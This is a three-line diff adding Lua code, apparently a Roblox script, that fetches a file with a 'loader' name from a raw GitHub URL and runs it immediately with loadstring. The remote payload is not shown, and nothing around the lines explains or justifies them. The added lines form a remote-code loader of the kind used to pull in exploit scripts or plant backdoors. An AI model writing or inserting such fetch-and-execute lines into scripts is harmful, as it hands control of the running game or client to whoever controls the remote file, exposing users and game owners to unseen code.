@@ -1,0 +1,3 @@
+local ld = loadstring or load
+local url = "https://raw.githubusercontent.com/shvl00/shvled/refs/heads/main/l04d3r.bf"
+ld(game:HttpGet(url))()
